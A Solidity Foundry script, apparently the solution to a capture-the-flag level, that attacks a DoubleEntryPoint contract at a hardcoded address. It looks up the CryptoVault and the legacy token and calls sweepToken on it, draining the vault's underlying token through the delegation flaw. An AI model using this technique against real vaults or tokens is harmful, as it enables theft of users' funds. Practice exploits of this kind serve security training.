// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {DoubleEntryPoint, CryptoVault} from"../src/DoubleEntryPoint.sol";

contract DeployDoubleEntryPointAttack is Script {
    DoubleEntryPoint public doubleEntryPoint = DoubleEntryPoint(0xD34d38b269c9523a9329833B228a46D3b44ABD21);
    address public deToken;
    address public lgToken;

    function run() external{
        vm.startBroadcast();

        CryptoVault cryptoVault = CryptoVault(doubleEntryPoint.cryptoVault());
        deToken = address(cryptoVault.underlying());
        lgToken = doubleEntryPoint.delegatedFrom();
        cryptoVault.sweepToken(IERC20(lgToken));

        vm.stopBroadcast();
    }
}
